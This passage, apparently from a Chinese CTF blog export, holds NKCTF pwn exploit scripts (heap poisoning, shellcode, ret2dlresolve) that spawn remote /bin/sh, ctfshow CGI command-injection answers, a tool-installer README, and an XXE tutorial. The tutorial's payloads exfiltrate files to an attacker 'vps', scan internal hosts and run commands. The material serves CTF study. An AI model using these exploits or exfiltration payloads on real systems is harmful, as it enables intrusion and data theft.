free(i)\n\n#gdb.attach(p)\n#pause()\n\nadd(7,0x48)\nedit(7,b'\\n')\nshow(7)\n\npause()\nd=u64(p.read(6).ljust(8,b'\\x00'))&0xffffffffffffff00\nmain_area=d-0x60\nprint(hex(d))\nmalloc_hook=main_area-0x10\nlibc.address=malloc_hook-libc.sym['__malloc_hook']\nfree_hook=libc.sym['__free_hook']\nsystem=libc.sym['system']\nfor i in range(7):\n    add(6-i,0x88)\nshow(1)\n\nheap_1_c=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nheap=calc_fd(heap_1_c,0x2a0)\nprint(hex(heap))\npause()\n\npad=b'\\x00'*0x58+p64(0x91)+b'\\n'\nedit(1,pad)\nedit(2,pad)\nedit(3,pad)\n\npad1=b'\\x00'*0x88+b'\\xf1'\nedit(0,pad1)\nfree(1)\n\nadd(1,0xe8)\nfree(3)\nfree(2)\n\npayload=b'\\x00'*0x88+p64(0x91)+p64(enc_fd(heap+0x290+0x90+0x90+0x10,free_hook))+b'\\n'\nedit(1,payload)\n\nedit(0,b'/bin/sh\\x00\\n')\n\nadd(2,0x88)\nadd(3,0x88)\nedit(3,p64(system)+b'\\n')\nfree(0)\n\n\n\np.interactive()\n```\n\n## 9961code\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\n\nsh=\"\"\"\nsyscall\nmov rdi,r15\nand esi,edi\nmov dx,0xf\nadd eax,0x30\nsyscall\nmov esi,edi\nxor edi,edi\njmp rsi\n\"\"\"\n\nsh1=\"\"\"\nsyscall\nadd edx,0x30\nmov ax,0\njmp rsi\n\"\"\"\n\nsh2=\"\"\"\n    syscall\n    mov edi,0x9961020\n    xor rsi,rsi\n    xor rdx,rdx\n    mov ax,0x3b\n    syscall\"\"\"\n\n\n\nprint(len(asm(sh)))\n#p=process('./pwn')\np=remote(\"node2.yuzhian.com.cn:32041\")\n#gdb.attach(p,'bp main+294')\n#p=remote(\"node2.yuzhian.com.cn:30693\")\npause()\np.sendafter('shellcode',asm(sh))\npause()\np.sendline(asm(sh1))\npause()\np.sendline(asm(sh2).ljust(0x20,b'\\x90')+b'/bin/sh\\x00')\np.interactive()\n```\n\n\n## only_read\n\n```python\nfrom pwn import *\nimport base64\n\ne=ELF('./pwn')\nread=0x4013d0\nleave=0x4013e7\nret=0x4013e8\nfrom mcrypt import *\n\n\nc=[b\"Welcome to NKCTF!\\x00\",\\\n        b\"tell you a secret:\\x00\",\\\n        b\"I'M RUNNING ON GLIBC 2.31-0ubuntu9.9\\x00\",\\\n        b\"can you find me?\\x00\"]\n\n#p=process('./pwn')\np=remote(\"node2.yuzhian.com.cn:31146\")\nbase=b64()\nbase.setbase(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\")\nfor i in c:\n    print(i)\n    p.sendline(base.encode(i))\n    pause()\n\nrel=0x4005d8\n#str_t=0x3ff388\n#sym=0x3ff420\nsym=0x4003d0\nstr_t=0x4004c0\nbss=0x404900+0xc0*8+0x40+0x20\nprint(hex(bss))\nsym_ind=905\nfunc_got=e.got['memset']\n\nrdi=0x00401683\nrel_add=bss+6*0x8+0x18\nsym_add=bss+6*0x8\nprint(hex(rel_add))\n\ngogo=0x401039\n#p.interactive()\n\npad=b'\\x00'*0x10\npad_n=3\nbin_sh=bss\nsystem=bss+0x28\nstr_=b'/bin/sh\\x00\\x00system\\x00'\nsym_=p32(system-str_t)+p64(12)+p32(0)*3\nrel_=p64(bss-0x30)+p32(7)+p32((sym_add-sym)//0x18)+p32(0)*2\n\n#gdb.attach(p,'bp 0x401039')\n#pause()\nprint(hex(rel_add-rel))\n\n\n\npayload2=b'\\x00'*0x30\npayload2+=b\"/bin/sh\\x00\"+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//0x18+1)\npayload2+=b\"system\\x00\\x00\"\npayload2+=sym_+p64(0)*2+rel_\n\n\npayload=b'a'*0x30+p64(bss)+p64(read)\np.sendline(payload)\npause()\n\np.sendline(payload2)\n\np.interactive()\n```\n\n## note\n\n```python\nfrom pwn import *\n\ndef add(ind,size,data=\" \"):\n    p.sendlineafter(\"choice: \",'1')\n    p.sendlineafter('Index: ',str(ind))\n    p.sendlineafter('Size: ',str(size))\n    p.sendafter(\"Content: \",data)\n\ndef edit(ind,data):\n    p.sendlineafter(\"choice: \",'2')\n    p.sendlineafter('Index: ',str(ind))\n    p.sendlineafter('Size: ',str(len(data)))\n    p.sendafter(\"Content: \",data)\n\ndef free(ind):\n    p.sendlineafter(\"choice: \",'3')\n    p.sendlineafter('Index: ',str(ind))\n\ndef show(ind):\n    p.sendlineafter(\"choice: \",'4')\n    p.sendlineafter('Index: ',str(ind))\n\n\n\n\ne=ELF('./nk_note')\ncontext.binary=e\nlibc=ELF('./libc.so')\n\np=remote(\"node2.yuzhian.com.cn:30946\")\n#p=process(\"./nk_note\")\n#gdb.attach(p)\ncontext.log_level='debug'\nshow(16)\nd=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nprint(hex(d))\npause()\nadd(0,0x500,\"/bin/sh\\x00\")\nadd(1,0x300)\nadd(2,0x100)\nadd(3,0x80)\nadd(4,0x40)\nadd(5,0x20)\npayload=b'a'*0x10\nedit(16,payload)\nshow(16)\np.readuntil('a'*0x10)\nd1=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nprint(hex(d1))\ne.address=d1-0x4120\n\nfunc='puts'\nfunc_got=e.got[func]\n\n\nl=[]\nfor i in range(0x6B):\n    payload='a'*i*8\n    edit(16,payload)\n    show(16)\n    data=p.readuntil('\\n',drop=1).strip(b'a').ljust(8,b'\\x00')\n    dn=u64(data)\n    l.append(dn)\n\nprint(l)\npause()\npayload=flat(l)+p64(e.address+0x4150)\nedit(16,payload)\nind=0x26\nprint(hex(e.address))\n\nadd(5,0x40)\n\nedit(5,p64(func_got))\nshow(ind)\ndd=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nprint(hex(dd))\nlibc.address=dd-libc.sym[func]\nprint(hex(libc.address))\nsystem=libc.sym['system']\nprint(hex(e.got['free']))\nedit(5,p64(e.got['free']))\nedit(ind,p64(system))\nfree(0)\np.interactive()\n```\n\n\n# reverse\n\n## ez_baby_apk\n\n使用jadx加雷电模拟器进行调试\n\n![](/img/wp/2023/2023nkctf-45.png)\n\n![](/img/wp/2023/2023nkctf-46.png)\n\n![](/img/wp/2023/2023nkctf-47.png)\n\n\n## PMKF\n\n![](/img/wp/2023/2023nkctf-48.jpg)\n\n```python\na=[\"1122\",\"3322\",\"1223\",\"2211\",\"0111\",\"1101\",\"0000\",\"0101\",\"1211\",\"0111\",\"2223\",\"2330\",\"3323\",\"2211\",\"1112\",\"2333\"]\ne=[]\nk=b'nkman'\nk1=0\nfor i in k:\n    k1+=i\nk1=k1&0xff\nprint(k1)\nfor i in a:\n    c=''\n    for j in i:\n        c+=bin(int(j))[2:].zfill(2)\n    e.append(int(c,2)^k1)\nprint((b'\\x05'+b'nkman'+bytes(e)).hex())\n```\n\n## babyrust\n\n![](/img/wp/2023/2023nkctf-49.jpg)\n\n```python\na=b\")&n_qFb'NZXpj)*bLDmLnVj]@^_H\"\ne=[]\nfor i in a:\n    d=(i-0x28+45)^0x30\n    if d<0x20:\n        d=d+48\n    e.append(d)\nprint(bytes(e))\n```","tags":["wp","2023竞赛","nkctf"],"categories":["wp"]},{"title":"【ctfshow】web入门-嵌入式","url":"/posts/dc70584a/","content":"\n环境模拟搭建：[Nginx支持web界面执行bash|python等系统命令和脚本](https://me.jinchuang.org/archives/114.html)\n\n\n# web461\n\n```bash\n#!/bin/bash\n  OIFS=\"$IFS\"\n  IFS=\",\"\n  set $QUERY_STRING\n  Args=($QUERY_STRING)\n  IFS=\"$OIFS\"\n  if [ \"${Args[2]}\"ctf = \"admin\"ctf ]; then\n          echo \"`${Args[0]}$IFS${Args[1]}`\"\n  fi\nexit 0\n```\n\n以逗号分割值，第三个值等于admin即可rce\n\n`?cat,/flag,admin`\n\n\n\n\n# web462\n\n```bash\n#!/bin/bash\n OIFS=\"$IFS\"\n  IFS=\",\"\n  set $QUERY_STRING\n  Args=($QUERY_STRING)\n  IFS=\"$OIFS\"\n  if [ \"${Args[0]}\"ctf = \"ping\"ctf ]; then\n          addr=\"`echo ${Args[1]} | sed 's|[\\]||g' | sed 's|%20| |g'`\"\n          addr=\"ping -c 1 \"$addr\n          $addr\n  fi\n```\n\n与上一题差不多，多了两个过滤\n\n不过测试后发现不出网。。做不出来\n\nhttps://www.reddit.com/r/securityCTF/comments/15stmxp/a_problem_about_linux_bashcgi_command_injection/?rdt=42831\n\n\n# web463\n\n```cpp\n#include <stdlib.h>\n#include \"fcgi_stdio.h\"\n#include <cstring>\n\n\n/* just get lastest info */\nint _System(const char * cmd, char *pRetMsg, int msg_len)\n{\n\tFILE * fp;\n\tchar * p = NULL;\n\tint res = -1;\n\tif (cmd == NULL || pRetMsg == NULL || msg_len < 0)\n\t{\n\t\tprintf(\"Param Error!\\n\");\n\t\treturn -1;\n\t}\n\tif ((fp = popen(cmd, \"r\") ) == NULL)\n\t{\n\t\tprintf(\"Popen Error!\\n\");\n\t\treturn -2;\n\t}\n\telse\n\t{\n\t\tmemset(pRetMsg, 0, msg_len);\n\t\t//get lastest result\n\t\twhile(fgets(pRetMsg, msg_len, fp) != NULL)\n\t\t{\n\t\t\tprintf(\"Msg:%s\",pRetMsg); //print all info\n\t\t}\n\n\t\tif ( (res = pclose(fp)) == -1)\n\t\t{\n\t\t\tprintf(\"close popenerror!\\n\");\n\t\t\treturn -3;\n\t\t}\n\t\tpRetMsg[strlen(pRetMsg)-1] = '\\0';\n\t\treturn 0;\n\t}\n}\n\nint main(void)\n{\n    int count = 0;\n    char *cmd = \"\";\n    char a8Result[128] = {0};\n    int ret = 0;\n    while (FCGI_Accept() >= 0)\n        printf(\"Content-type: text/html\\r\\n\"\n        \"\\r\\n\"\n        \"<title>CTFshow</title>\"\n        \"<h1>where is flag?</h1>\"\n        );\n        cmd=getenv(\"QUERY_STRING\");\n\tret  = _System(cmd, a8Result, sizeof(a8Result));\n        printf(\"ret = %d \\nresult = %s\\nlength = %d \\n\", ret, a8Result, strlen(a8Result));\n    return 0;\n}\n\n```\n\n可以直接执行命令\n\n`?cat$IFS/flag`\n\n\n# web464\n\n\n```cpp\n#include <stdlib.h>\n#include \"fcgi_stdio.h\"\n#include <cstring>\n\n\n/* just get lastest info */\nint _System(const char * cmd, char *pRetMsg, int msg_len)\n{\n\tFILE * fp;\n\tchar * p = NULL;\n\tint res = -1;\n\tif (cmd == NULL || pRetMsg == NULL || msg_len < 0)\n\t{\n\t\tprintf(\"Param Error!\\n\");\n\t\treturn -1;\n\t}\n\tif ((fp = popen(cmd, \"r\") ) == NULL)\n\t{\n\t\tprintf(\"Popen Error!\\n\");\n\t\treturn -2;\n\t}\n\telse\n\t{\n\t\tmemset(pRetMsg, 0, msg_len);\n\t\t//get lastest result\n\t\twhile(fgets(pRetMsg, msg_len, fp) != NULL)\n\t\t{\n\t\t\tprintf(\"Msg:%s\",pRetMsg); //print all info\n\t\t}\n\n\t\tif ( (res = pclose(fp)) == -1)\n\t\t{\n\t\t\tprintf(\"close popenerror!\\n\");\n\t\t\treturn -3;\n\t\t}\n\t\tpRetMsg[strlen(pRetMsg)-1] = '\\0';\n\t\treturn 0;\n\t}\n}\n\nint main(void)\n{\n    int count = 0;\n    char *cmd = \"\";\n    char a8Result[128] = {0};\n    int ret = 0;\n    while (FCGI_Accept() >= 0)\n        printf(\"Content-type: text/html\\r\\n\"\n        \"\\r\\n\"\n        \"<title>CTFshow</title>\"\n        \"<h1>where is flag?</h1>\"\n        );\n        cmd=getenv(\"QUERY_STRING\");\n\tret  = _System(cmd, a8Result, sizeof(a8Result));\n    return 0;\n}\n\n```\n\n与上一题相比少了输出，但是没什么区别\n\n`?cat$IFS/flag`\n\n\n\n\n\n# web465\n\n给了编译好的cgi文件\n\n逆向发现在main中没有直接调用`_System`，猜测需要溢出到`_System`然后就可以执行命令\n\n不过地址不确定，暂时做不出来\n\n\n","tags":["wp","ctfshow-web入门"],"categories":["wp"]},{"title":"CTF_misc_auto_deploy","url":"/posts/b9ea1bfd/","content":"\n# CTF_misc_auto_deploy\n\n一个自动部署Misc工具的~~轻量~~sh脚本\n闲的无聊随便写的小玩意\n适合在新环境中快速搭建misc环境\n\n[项目地址](https://github.com/dr0n1/CTF_misc_auto_deploy)\n\n# 目前支持的功能\n\n1：换网络源，允许 root ssh登录\n2：安装docker\n3：安装docker-compose\n4：安装golang\n5：安装java\n6：安装 linux 下的部分 misc 工具和第三方脚本（我知道的），具体如下\n\n```text\nbinwalk\nbkcrack\nblindwatermark\ncloacked-pixel\ndtmf2num\ndwarf2json\nexif\nextundelete\nf5-steganography\nforemost\ngaps\ngnuplot\nminimodem\nmontage\noutguess\npycdc\nsstv\nsteghide\nstegosaurus\nstegpy\nstegseek\nusb-mouse-pcap-visualizer\nusbkeyboarddatahacker\nvolatility2\nvolatility3\nwebp\nwireshark\nzsteg\n```\n\n\n\n# 支持的系统\n\nubuntu16.04/18.04/20.04/22.04\n\n推荐 ubuntu20 加代理运行\n\n\n# 使用\n\n本脚本可重复运行安装\n工具保存在运行脚本的`misc_tools`目录下\n\n\n方法一：\ngit clone https://github.com/dr0n1/CTF_misc_auto_deploy\nchmod 777 auto_deploy.sh\n./auto_deploy.sh [mode]\n\n```shell\nusage: ./auto_deploy.sh [mode]\n        basics              基础配置(换源，vim，ssh)\n        docker              安装docker\n        docker-compoer      安装docker-compose\n        go                  安装golang\n        java                安装java\n        misc-tools          安装misc工具\n```\n\n方法二：\nbash <(curl -s https://raw.githubusercontent.com/dr0n1/CTF_misc_auto_deploy/main/auto_deploy.sh) [mode]\n\n![](https://raw.githubusercontent.com/dr0n1/CTF_misc_auto_deploy/main/auto_deploy.gif)\n\n# 更新日志\n\nV1.0: 第一代脚本\nV1.1: 增加 python 安装模块\nV1.2: 优化安装逻辑等\nV1.3：移除 python，新增 golang 和 java\nV2.1：增加 CTF-Misc 部分工具的安装\nV2.2：优化可重复运行脚本逻辑\nV2.3：优化部分 python 模块安装逻辑\nV2.4：增加部分misc工具，格式化代码\nV3.1：移除了centos的工具支持，增加golang多版本支持等\nV3.2：修复了诺干bug，增加了java版本管理\n\n\n# 后续计划\n\n1：计划增加 web 系列工具\n\n有疑问或者有更好的建议请联系1930774374@qq.com","tags":["misc","自动化","自研工具"],"categories":["项目"]},{"title":"xxe学习总结","url":"/posts/aaf14e8/","content":"\n\n# 从XML到XXE #\n\n## XML ##\n\n**什么是 XML？**\nXML 指可扩展标记语言（EXtensible Markup Language）。\nXML 的设计宗旨是传输数据，而不是显示数据。\nXML 是 W3C 的推荐标准。\nXML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。\nXML 语言没有预定义的标签。\n\n\n\n**XML 和 HTML 之间的差异**\nXML 不是 HTML 的替代。\nXML 和 HTML 为不同的目的而设计：\n>XML 被设计用来传输和存储数据，其焦点是数据的内容。\n>HTML 被设计用来显示数据，其焦点是数据的外观。\n>HTML 旨在显示信息，而 XML 旨在传输信息。\n\nXML文档结构包括`XML声明`、`DTD文档类型定义（可选）`、`文档元素`。\n```xml\n<!--XML申明-->\n<?xml version=\"1.0\"?>\n\n<!--文档类型定义-->\n<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->\n<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->\n<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->\n<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->\n<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->\n<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->\n]>\n\n<!--文档元素-->\n<note>\n<to>Dave</to>\n<from>Tom</from>\n<head>Reminder</head>\n<body>You are a good man</body>\n</note>\n```\n\n\n## DTD ##\n\nDTD(文档类型定义，Document Type Definition )的作用是定义`XML`文档的合法构建模块。它使用一系列的合法元素来定义文档结构。\n\n### DTD引用方式 ###\n\n1）DTD 内部声明\n`<!DOCTYPE 根元素 [元素声明]>`\n\n2）DTD 外部引用\n`<!DOCTYPE 根元素名称 SYSTEM \"外部DTD的URI\">`\n\n3）引用公共DTD\n`<!DOCTYPE 根元素名称 PUBLIC \"DTD标识名\" \"公用DTD的URI\">`\n\n\n### DTD 关键字 ###\n- DOCTYPE（DTD的声明）\n- ENTITY（实体的声明）\n- SYSTEM、PUBLIC（外部资源申请）\n- ELEMENT（定义元素声明）\n\n\n## 实体 ##\n\n实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。\n实体按类型主要分为以下四种：\n\n- 内置实体 (Built-in entities)\n- 字符实体 (Character entities)\n- 通用实体/普通实体 (General entities)\n- 参数实体 (Parameter entities)\n\n**内置实体**\n\n```text\n&符号: &amp;\n单引号: &apos;\n＞: &gt;\n＜: &lt;\n双引号: &quot;\n```\n\n**字符实体**\n\n通常是`html`的实体编码，例如：\n```xml\n<?xml version = \"1.0\" encoding = \"UTF-8\" standalone = \"yes\"?>\n<!DOCTYPE author[\n   <!ELEMENT author (#PCDATA)>\n   <!ENTITY copyright \"&#169;\">\n]>\n<author>&writer;&copyright;</author>\n```\n\n`&#169`即`©`\n\n**普通实体**\n\n例如：\n```xml\n<?xml version = \"1.0\"?>\n\n<!DOCTYPE note [\n   <!ENTITY source-text \"tutorialspoint\">\n]>\n\n<note>\n   &source-text;\n</note>\n```\n\n**参数实体**\n\n例如\n```xml\n<!ENTITY % ename \"entity_value\">\n```\n\n参数实体必须先定义再使用，而不能像一般实体那样随意放置。\n\n\n### 内部实体与外部实体 ###\n\n\n实体根据引用方式，还可分为内部实体与外部实体。\n\n内部实体：\n`<!ENTITY entity_name \"entity_value\">`\n\n外部实体：\n`<!ENTITY name SYSTEM \"URI/URL\">`\n\n### 通用实体和参数实体 ###\n\n其实按照使用来分类，又可以将实体分为通用实体和参数实体。\n\n通用实体：\n用`&实体名;`引用的实体，他在`DTD`中定义，在`XML`文档中引用\n\n参数实体：\n使用`% 实体名`在`DTD`中定义，并且只能在`DTD`中使用`%实体名;`引用\n只有在`DTD`文件中，参数实体的声明才能引用其他实体\n和通用实体一样，参数实体也可以外部引用\n\n\n\n### 不同程序支持的协议 ###\n\n![](/img/summary/xxe-4.png)\n\n>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35\n>2.libxml 是 PHP 的 xml 支持\n\nPHP支持的协议会更多一些，但需要一定的扩展：\n\n![](/img/summary/xxe-9.png)\n\n\n\n## XXE ##\nXXE漏洞全称`XML External Entity Injection`即XML外部实体注入。\nXXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。\n\n\n# XXE的几种利用方式 #\n\n## 有回显任意文件读取(Normal Based XXE) ##\n\n服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件\n\nxxe.php\n```php\n<?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input'); //获取客户端输入内容\nif(isset($xmlfile)){\n    $dom = new DOMDocument();    //初始化XML解析器\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载客户端输入的XML内容\n    $creds = simplexml_import_dom($dom);  //获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE\n    echo $creds;\n}\nhighlight_file(__FILE__);\n?>\n```\n\n\n\npayload\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n<a>&xxe;</a>\n```\n\n![](/img/summary/xxe-1.png)\n\n### 特殊符号 ###\n\n\n如果读取的文件中包含特殊符号，比如`<`、`>`、`&`、`\"`、`'`等，就会返回一些报错信息\n\n这时可以使用`CDATA`或者`base64 convert`\n\n术语`CDATA`指的是不应由`XML解析器`进行解析的文本数据`（Unparsed Character Data）`\n`CDATA`部分由`\"<![CDATA[\"`开始，由`\"]]>\"`结束，解析器会忽略`CDATA`部分中的所有内容\n\n我们的思路就是把读取的文件放在CDATA中之后再调用\n\npayload\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE test\n[<!ENTITY start\n\"<![CDATA[<!ENTITY % xxe SYSTEM \"file:///flag\"> ]]>\"\n>]\n% xxe;>\n<test>&start</test>\n```\n\n不过使用这个payload读文件时还是会报错，因为在`xml`中，`xml`解析器有个限制：不能在内部`Entity`中引用，`“PEReferences forbidden in internal subset in Entity ”`指的就是禁止内部参数实体引用\n\n所以需要调用的外部的`dtd`\n\npayload\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE root [\n<!ENTITY % start \"<![CDATA[\">\n<!ENTITY % go SYSTEM \"file:///flag\">\n<!ENTITY % end \"]]>\">\n<!ENTITY % dtd SYSTEM \"http://vps/evil.dtd\">%dtd;\n]>\n<root>&all;</root>\n```\n\nevil.dtd\n```xml\n<!ENTITY all \"%start;%go;%end;\">\n```\n\n![](/img/summary/xxe-2.png)\n\n\n\n## 无回显任意文件读取(Blind Based XXE) ##\n\nxxe.php\n\n```php\n<?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);\n?>\n```\n\n### 出网 ###\n\npayload\n```xml\n<!DOCTYPE convert [\n<!ENTITY % remote SYSTEM \"http://vps/evil.dtd\">\n%remote;%int;%send;\n]>\n```\n\nevil.dtd\n\n```xml\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\">\n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://vps:port?a=%file;'>\">\n```\n\nvps上监听对应的端口\n\n![](/img/summary/xxe-3.png)\n\n\n先调用了`%remote`，请求远程服务器上的`evil.dtd`，类似php的`include`，然后`%int`调用`%file`，`%file`获取敏感文件后将结果填入到`%send`，最后调用`%send`把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有`%`, 所以将其转成html实体编码\n\n\n### 不出网 ###\n\n以上都是引入外部服务器的`OOB XXE（Out-of-band）`，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。\n\n这时候就可以考虑利用本地dtd来进行XXE\n\nlinux\n```xml\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamsa 'Your DTD code'>\n%local_dtd;\n```\n\n\nwindows\n```xml\n<!ENTITY % local_dtd SYSTEM \"file://C:/Windows/System32/wbem/xml/cim20.dtd\">\n<!ENTITY % SuperClass '>Your DTD code<!ENTITY test \"test\"'>\n%local_dtd;\n```\n\n引用内部实体payload\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE message [\n    <!ENTITY % remote SYSTEM \"/usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\">\n    <!ENTITY % ISOamso '\n        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://hhhhhhhh/?&#x25;file;&#x27;>\">\n        &#x25;eval;\n        &#x25;send;\n    '>\n    %remote;\n]>\n<message>1234</message>\n```\n\n\n\n\n\n## 基于报错的XXE(Error Based XXE) ##\n\n基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。\n\n\n出网payload\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE message [\n    <!ENTITY % remote SYSTEM \"https://vps/evil.dtd\">\n    <!ENTITY % file SYSTEM \"file:///flag\">\n    %remote;\n    %error;\n]>\n\n<message>test</message>\n```\n\nevil.dtd\n```xml\n<!ENTITY % start \"<!ENTITY &#37; error SYSTEM 'file:///fakefile/%file;'>\">\n%start;\n```\n\n\n\n不出网如果可以写文件的话就可以构造本地恶意dtd\n\n\n不出网payload\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE message [\n<!ENTITY % local_dtd SYSTEM \"file:///tmp/evil.dtd\">\n    <!ENTITY % condition 'aaa)>\n        <!ENTITY &#x25; file SYSTEM \"file:///flag\">\n        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n        &#x25;eval;\n        &#x25;error;\n        <!ELEMENT aa (bb'>\n    %local_dtd;\n]>\n<user>\n            <username>flag</username>\n            <password>root</password>\n</user>\n```\n\nevil.dtd\n```xml\n<!ENTITY % condition \"and | or | not | equal | contains | exists | subdomain-of\">\n<!ELEMENT pattern (%condition;)>\n```\n\n\n## 探测内网主机与端口 ##\n\n利用http协议和网页响应时间来判断主机存活\n\nexp\n```python\nimport requests\nimport base64\ndef XXE(ip,string):\n    try:\n        xml = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\"?>\"\"\"\n        xml = xml + \"\\r\\n\" + \"\"\"<!DOCTYPE foo [ <!ELEMENT foo ANY >\"\"\"\n        xml = xml + \"\\r\\n\" + \"\"\"<!ENTITY xxe SYSTEM \"\"\" + '\"' + string + '\"' + \"\"\">]>\"\"\"\n        xml = xml + \"\\r\\n\" + \"\"\"<xml>\"\"\"\n        xml = xml + \"\\r\\n\" + \"\"\"    <stuff>&xxe;</stuff>\"\"\"\n        xml = xml + \"\\r\\n\" + \"\"\"</xml>\"\"\"\n        x = requests.post('http://192.168.91.134/xml.php', data=xml, headers=headers, timeout=5).text\n        coded_string = x.split(' ')[-2]\n        print(' [+]',ip,'Successfully Found !!!')\n    except:\n        print(' [-]',ip,'Error Not Found !!!')\n        pass\n\nif __name__ == '__main__':\n    headers = {'Content-Type':'application/xml'}\n    for i in range(130,150):\n        ip = '192.168.91.' + str(i)\n        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'\n        XXE(ip,string)\n```\n\n\n根据返回内容的不同来判断端口是否开启\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE xxe SYSTEM \"http://192.168.91.149:80\" [\n<!ELEMENT xxe (#PCDATA) >\n]>\n<xxe>666</xxe>\n```\n\n\n## 执行系统命令 ##\n\n在安装`expect`扩展的`PHP`环境里执行系统命令\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM \"expect://id\" >]>\n<root>\n<name>&xxe;</name>\n</root>\n```\n\n\n## 编码绕过 ##\n\n```php\n<?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/<\\?xml version=\"1\\.0\"|http/i', $xmlfile)){\n    die('error');\n}\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);\n?>\n```\n\n利用`utf-16`编码绕过\n\n```python\nimport requests\nurl = 'http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/'\npayload = '''\n<!DOCTYPE convert [\n<!ENTITY % remote SYSTEM \"http://vps/evil.dtd\">\n%remote;%int;%send;\n]>\n'''\npayload = payload.encode('utf-16')\nrep = requests.post(url=url, data=payload)\nprint(rep.text)\n```\n\n或者命令转换编码`iconv -f utf8 -t UTF-32LE  1.xml > 2.xml`，`echo urlencode(file_get_contents(\"payload.xml\"));`读\n\n\n## jar:// 文件上传 ##\n\n`Java`环境下还可以利用`jar`协议上传文件\n\n`jar`协议语法，`jar:{url}!/{entry}`，`url`是文件的路径，`entry`是想要解压出来的文件\n\njar 协议处理文件的过程：\n1：下载 jar/zip 文件到临时文件中\n2：提取出我们指定的文件\n3：删除临时文件\n\n\npayload\n```xml\n<!DOCTYPE convert [\n<!ENTITY  remote SYSTEM \"jar:http://ip:port/1.zip!/1.php\">\n]>\n<convert>&remote;</convert>\n```\n\n当`1.zip`中没有`1.php`时，`java`解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于`php`的`phpinfo`临时文件包含\n\n\n本地搭建一个环境测试：\n\nmain.java，部署在tomcat上，模拟一个存在xxe漏洞的网页\n```java\nimport org.w3c.dom.Element;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\nimport org.xml.sax.InputSource;\nimport org.w3c.dom.Document;\nimport org.xml.sax.SAXException;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.*;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\n\n@WebServlet(\"/xxe\")\npublic class main extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{\n\n    }\n\n    @Override\n    protected void 